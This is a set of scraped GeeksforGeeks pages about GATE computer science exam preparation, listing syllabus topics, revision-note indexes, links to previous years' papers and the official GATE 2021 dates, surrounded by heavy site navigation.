propagation, liveness analysis, common subexpression elimination. Introduction of Compiler : Introduction of Compiler design Phases of a Compiler Symbol Table in Compiler Static and Dynamic Scoping Generation of Programming Languages Error Handling in Compiler Design Error detection and Recovery in Compiler Linker Lexical analysis : Lexical Analysis C program to detect tokens in a C program Fast Lexical Analyzer Generator Parsing : Classification of Context Free Grammars Ambiguous Grammar Why FIRST and FOLLOW? FIRST Set in Syntax Analysis FOLLOW Set in Syntax Analysis Program to calculate First and Follow sets of given grammar Introduction to Syntax Analysis Parsing Set 1 Parsing Set 2 Parsing Set 3 Shift Reduce Parser in Compiler Classification of top down parsers Operator grammar and precedence parser Syntax directed transalation : Syntax Directed Translation S – attributed and L – attributed SDTs in Syntax directed translation Runtime environments : Runtime Environments Intermediate code generation : Intermediate Code Generation Three address code in Compiler Detection of a Loop in Three Address Code Code Optimization Introduction of Object Code Data flow analysis in Compiler CATEGORY ARCHIVES: COMPILER DESIGN Last Minute Notes – Compiler Design Introduction of Compiler : MCQ on Memory allocation and compilation process Lexical analysis : Lexical analysis Parsing : Compiler Theory | Set 1 Compiler Theory | Set 2 Syntax directed transalation : Parsing and Syntax directed translation Runtime environments : . Intermediate code generation : Code Generation and Optimization Compiler Design : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Book – Basics of Compiler Design Notes – Bivas Mitra IITgp Notes – LR Parsing Notes – Syntax Directed Translation Notes – Intermediate Code Generation Section 11: Digital Logic Boolean algebra Combinational and sequential circuits. Minimization Number representations and computer arithmetic (fixed and floating point) Introduction of Boolean Algebra and Logic Gates : Logic Gates Properties of Boolean algebra Minimization of Boolean Functions Representation of Boolean Functions Canonical and Standard Form Functional Completeness K-Map Implicants in K-Map PDNF and PCNF Variable entrant map (VEM) Consensus theorem Difference between combinational and sequential circuit Combinational Circuits : Half Adder Full Adder Half Subtractor Full Subtractor Half Adder and Half Subtractor using NAND NOR gates Encoders and Decoders Encoder Binary Decoder Combinational circuits using Decoder Multiplexers Carry Look-Ahead Adder Parallel Adder & Parallel Subtractor BCD Adder Magnitude Comparator BCD to 7 Segment Decoder Programmable Logic Array Programming Array Logic Read-Only Memory (ROM) Static Hazards Sequential Circuits : Introduction of Sequential Circuits Flip-flop types and their Conversion Synchronous Sequential Circuits Counters Ring Counter n-bit Johnson Counter Ripple Counter Design counter for given sequence Master Slave JK Flip Flop Asynchronous Sequential Circuits Shift Registers Design 101 sequence detector Amortized analysis for increment in counter Number Representation and Computer Airthmetic : Number System and base conversions Code Converters – BCD(8421) to/from Excess-3 Code Converters – Binary to/from Gray Code Program for Decimal to Binary Conversion Program for Binary To Decimal Conversion Program for Decimal to Octal Conversion Program for Octal to Decimal Conversion Program for Hexadecimal to Decimal Conversion Computer Arithmetic | Set – 1 Computer Arithmetic | Set – 2 Floating Point Representation What’s difference between 1’s Complement and 2’s Complement? Booth’s Algorithm Restoring Division Algorithm For Unsigned Integer Non-Restoring Division For Unsigned Integer CATEGORY ARCHIVES: DIGITAL ELECTRONICS & LOGIC DESIGN Last Minute Notes – Digital Electronics Digital Logic : Digital Logic (101) Number representation Digital Logic : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – Number System-Swarthmore Notes – IEEE Standard 754 Floating Point Numbers Last Updated on : 25th April, 2019 Other Useful Links : Important Topics for GATE 2020 Computer Science Last Minute Notes – GATE 2020 Top 5 Topics for Each Section of GATE CS Syllabus GATE CS 2020 Syllabus GATE CS 2020 Important Official Dates Articles on Computer Science Previous year papers GATE CS, solutions and explanations year-wise and topic-wise. GATE CS 2018 Mock Tests Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above! My Personal Notes arrow_drop_up Save Load Comments room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Short notes for GATE CSE Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects LMNs-Last Minute Notes Sudo GATE Followings are Last Minute Notes (i.e. LMN) which can be used for revision of concepts! By the way, we prefer to call these as LMNs ( pronounced as lemons 🙂 ) Algorithms C/C++ Data Structures DBMS Theory of Computation Digital Electronics Operating Systems Computer Organization Compiler Design Computer Networks Engineering Mathematics Discrete Mathematics Top 5 Topics for Each Section of GATE CS Syllabus GATE CS Notes/Tutorials (According to Official GATE 2019 Syllabus) My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GATE CS Preparation Notes and Solutions of Previous Year Papers Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects GATE CS Preperation All about GATE CS Preparation for 2019 aspirants. The page contains solutions of previous year GATE CS papers with explanations, topic wise Quizzes, notes/tutorials and important links for preparation. Register for Sudo GATE GATE CS Notes/Tutorials (According to Official GATE 2019 Syllabus) Previous Years’ questions/answers/explanation for GATE CS GATE CS 2020 GATE CS 2019 GATE CS 2018 GATE-CS-2017 (Set 1) GATE-CS-2017 (Set 2) GATE-CS-2016 (Set 1) GATE-CS-2016 (Set 2) GATE-CS-2015 (Set 1) GATE-CS-2015 (Set 2) GATE-CS-2015 (Set 3) GATE-CS-2014-(Set-1) GATE-CS-2014-(Set-2) GATE-CS-2014-(Set-3) GATE CS 2013 GATE CS 2012 GATE CS 2011 GATE CS 2010 GATE-CS-2009 GATE CS 2008 GATE-CS-2007 GATE-CS-2006 GATE-CS-2005 GATE-CS-2004 GATE-CS-2003 GATE-CS-2002 GATE-CS-2001 GATE-CS-2000 GATE-CS-1999 GATE-CS-1998 GATE-CS-1997 GATE-CS-1996 Previous Years’ questions/answers/explanation for GATE IT GATE-IT-2008 GATE-IT-2007 GATE-IT-2006 GATE-IT-2005 GATE-IT-2004 Topic-wise Mock Quizzes for GATE CS Data Structures and Algorithms Array Linked List Stack Queue Binary Trees Binary Search Trees Balanced Binary Search Trees B and B+ Trees Tree Traversals Heap Hash Graph Misc Analysis of Algorithms Analysis of Algorithms (Recurrences) Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking NP Complete Recursion Searching Sorting Graph Traversals Graph Shortest Paths Graph Minimum Spanning Tree Misc C Language Bit Algorithms Data Structures and Algorithm Operating Systems Operating System Notes Process Management CPU Scheduling Memory Management Input Output Systems Operating Systems DBMS ER and Relational Models Database Design (Normal Forms) SQL Transactions and concurrency control Sequential files, indexing, B & B+ trees Database Management Systems Compiler Design Lexical analysis Parsing and Syntax directed translation Code Generation and Optimization Compiler Design Theory of Computation Regular languages and finite automata Context free languages and Push-down automata Recursively enumerable sets and Turing machines Undecidability Automata Theory Computer Networks Data Link Layer Network Layer Transport Layer Misc Topics in Computer Networks Application Layer Network Security Computer Networks Engineering Mathematics Set Theory & Algebra Linear Algebra Numerical Methods and Calculus Graph Theory Combinatorics Propositional and First Order Logic Digital Logic Logic functions and Minimization Combinational Circuits Sequential circuits Number Representation Aptitude Probability English General Aptitude Computer Organization and Architecture Cache and main memory Pipelining and Addressing modes CPU control design and Interfaces Secondary memory and DMA GATE CS MOCK Tests Sudo GATE 2020 Sudo GATE 2019 GATE CS Mock 2018 | Set 1 GATE CS Mock 2018 | Set 2 GATE 2017 Mock I GATE 2017 Mock II GATE CS Mock 2016 GATE CS Mock 2015 Important Links: GATE CS Notes according to GATE 2020 syllabus GATE CS 2020 Important Official Dates GATE CS 2020 Syllabus Top 5 Topics for Section of GATE CS Syllabus How to prepare in Last 10 days for GATE? GATE CS Topic wise External Reference Links Previous Year GATE Official Question Papers Last Minute Notes Please write comments if you find anything incorrect or wish to share more information for GATE CS preparation. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Previous years GATE CSE and IT Papers Download Link Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Previous years GATE CSE and IT Papers Download Link GATE CS Notes according to GATE 2019 syllabus. You can find GeeksforGeeks’s solutions for these Papers. Year Original Paper Official Keys 2020 2020 Paper 2020 Keys 2019 2019 Paper 2019 Keys 2018 2018 Paper 2018 Keys 2017 2017 Set 1 Paper 2017 Set 1 Keys 2017 Set 2 Paper 2017 Set 2 Keys 2016 2016 Set 1 Paper 2016 Set 1 Keys 2016 Set 2 Paper 2016 Set 2 Keys 2015 2015 Set 1 Paper 2015 Set 1 Keys 2015 Set 2 Paper 2015 Set 2 Keys 2015 Set 3 Paper 2015 Set 3 Keys 2014 2014 Set 1 Paper 2014 Set 1 Keys 2014 Set 2 Paper 2014 Set 2 Keys 2014 Set 3 Paper 2014 Set 3 Keys 2013 2013 Paper 2013 Keys 2012 2012 Paper 2012 Keys 2011 2011 Paper 2011 Keys 2010 2010 Paper 2009 2009 Paper 2008 2008 CS Paper 2008 IT Paper 2007 2007 CS Paper 2007 IT Paper 2006 2006 CS Paper 2006 IT Paper 2005 2005 CS Paper 2005 IT Paper 2004 2004 CS Paper 2004 IT Paper 2003 2003 Paper 2002 2002 Paper 2001 2001 Paper 2000 2000 Paper 1999 1999 Paper 1998 1998 Paper 1997 1997 Paper 1996 1996 Paper 1995 1995 Paper 1994 1994 Paper 1993 1993 Paper 1992 1992 Paper 1991 1991 Paper My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GATE CS 2021 Official Important Dates - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Software Engineering | Coupling and CohesionGATE CS 2021 (Revised) SyllabusSoftware Engineering | Prototyping ModelIntroduction to AlgorithmsDifference between NP hard and NP complete problemAptitude for PlacementsSoftware Engineering | Classification of Software RequirementsFunctional Programming ParadigmDifference between GCC and G++Draw a moving car using computer graphics programming in CSoftware Engineering | Comparison of different life cycle modelsHow to Prepare for GATE CS 2021Software Engineering | Testing GuidelinesProgram for Deadlock free condition in Operating SystemIntroduction to Computer GraphicsProcess states and Transitions in a UNIX ProcessChain of Custody - Digital ForensicsDifference between Socket and Port?What is RC4 Encryption?GRE General Practice Test Series 2019 | GeeksforGeeksDifference between Inheritance and Interface in JavaBenefits of writing GATE examWhat is HTTP ETag?3 big changes in GATE 2021Software Engineering | Phases of Prototyping Model | Set - 2What is SDLC model and its PhasesVirtualization | Xen: ParavirtualizationWrite Blockers- An IntroductionPattern Recognition | Phases and Activities GATE CS 2021 Official Important Dates Last Updated: 21-08-2020 IIT Bombay is organizing GATE 2021. In this year, The GATE authority 2021 has made major changes and has also revised the syllabus of various GATE Papers. They also increase the number of consecutive days from three weeks to two weeks, due to COVID-19 pandemic. Before, it GATE exam was organized in three weeks but not it is going in only two weeks (may because of COVID-19 pandemic). GATE CS 2021 Official Important Dates : These are Official date(s) of the respective event of the GATE 2021 exam : Activity Day Date(s) GATE Online Application Processing System (GOAPS) Website Opens Monday 14th September 2020 Closing Date of REGULAR online registration / application portal Wednesday 30th September 2020 End of EXTENDED period for online registration / application (with late fee) Wednesday 7th October 2020 Last Date for change of category, paper and examination city (an additional fee will be applicable) Friday 13th November 2020 Availability of Admit Card on the Online Application Portal (for download and printing) Friday 8th January 2021 GATE 2021 Examination Forenoon: 9:00 AM to 12:00 Noon (Tentative) Afternoon: 3:00 PM to 6:00 PM (Tentative) Friday Saturday Sunday Friday Saturday Sunday 5th February 2021 6th February 2021 7th February 2021 12th February 2021 13th February 2021 14th February 2021 Announcement of results in the Online Application Portal Monday 22nd March 2021 Important Note : The health and safety of the candidates are of utmost priority. Due to current COVID-19 pandemic situation, dates mentioned here are subject to change. In rare cases, it may be necessary to postpone the GATE 2021 examination because of situations beyond the control of GATE committee. All updates will be available on this website. Register for Sudo GATE Important Links: Official website for GATE 2021 exam – GATE IIT Bombay GATE CS Notes according to GATE 2021 syllabus GATE CS previous year solved papers Important topics for GATE 2021 Computer Science Last minute notes for GATE CS GATE CS 2017 Mock Tests GATE CS 2018 Mock Tests GATE CS 2019 Mock Tests Articles on Computer Science subjects Attention reader! Don’t stop learning now. Get hold of all the important CS Theory concepts for SDE interviews with the CS Theory Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:GATE CS 2020 Important Official DatesGATE 2016 Important Dates and LinksGATE 2017 Important dates and linksGATE CS 2019 important dates and linksTCS CodeVita 2020 - Important Dates, Eligibility, How to Apply?Google Kick Start - Important Dates, Eligibility, Contest DetailsKotlin | Language for Android, now Official by GoogleImportant Topics for GATE 2020 Computer ScienceSubjectwise Important Topics for GATE 2020 Computer ScienceLAMP installation and important PHP configurations on UbuntuCoding good - Important criterias5 Reasons Why Hackathons are Important in a Coder’s LifeWhat are the Important AWS Cloud Services?Important Blockchain terminologiesImportant Tips on How To Prepare for the GRE10 Reasons Why SEO is Important for a WebsiteWhy Internships are Important for Engineering Students or Freshers?Some Important terms in Ethical HackingWhy Cloud Computing is Important in Data Science?Important Reasons for Selecting Weebly for Building a WebsiteMithlesh UpadhyayCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to 